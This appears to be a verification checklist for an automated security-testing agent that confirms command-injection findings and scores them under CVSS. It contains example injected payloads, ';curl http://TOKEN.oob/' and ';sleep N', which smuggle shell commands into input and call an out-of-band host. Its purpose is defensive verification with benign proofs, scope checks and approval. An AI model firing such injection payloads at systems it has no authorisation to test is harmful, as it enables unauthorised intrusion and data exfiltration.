# Command Injection — VERIFY (SEMANTIC gate)
# Inherits _contract/verify-base.md. SUBAGENT, fresh context. Precondition: review.md PASSED.

Run the 7 base checks + the command-injection gauntlet. Confirmed = a benign proof that an OS command
EXECUTED (OOB callback or controlled timing) — not reflected input. Re-run the benign proof.

## Command-injection false-positive gauntlet (base check #3)
- [ ] **Execution proven, benignly.** Evidence is an OOB interaction from the server (`;curl
      http://TOKEN.oob/` → attributable callback) OR a reproducible timing delay tracking `;sleep N`
      (controlled for jitter, multiple samples). Reflected metacharacters without an execution signal
      are NOT confirmation.
- [ ] **Attributable (OOB).** The callback token maps to exactly one sink, from the target egress —
      not a scanner / preview bot.
- [ ] **Not another injection.** The sink is an OS command (shell), distinguished from SSTI
      (template) or SQLi — the proof is shell execution.
- [ ] **Benign + minimal.** Only `sleep` / OOB / an identity exfil to OOB was used — no destructive
      commands, shells, or file/process tampering. Flag any non-benign payload.
- [ ] **Scope + approval.**

## CVSS integrity
Command injection = RCE → Critical (`S:C` likely). Justify from the benign execution proof; blind
(timing-only) is still Critical if execution is reproducible.

## Verdict (write into each finding's review{} block)
```json
"review": { "verdict": "accepted|rejected|needs-evidence", "reviewer": "command-injection-verify",
  "rubric": {"evidence":"pass","reproducibility":"pass","fp_gauntlet":"pass","cvss":"pass","coverage":"pass","scope":"pass"},
  "false_positive_checks": ["payload ;curl http://t1.oob/ -> HTTP callback from target egress (token t1); sleep 5 delay reproduced x3; benign only"],
  "scope_ok": true, "notes": "no destructive command; approved; kill switch tested" }
```
- `accepted` → `status: verified` → reporting. `rejected`/`needs-evidence` → bounce + re-run.
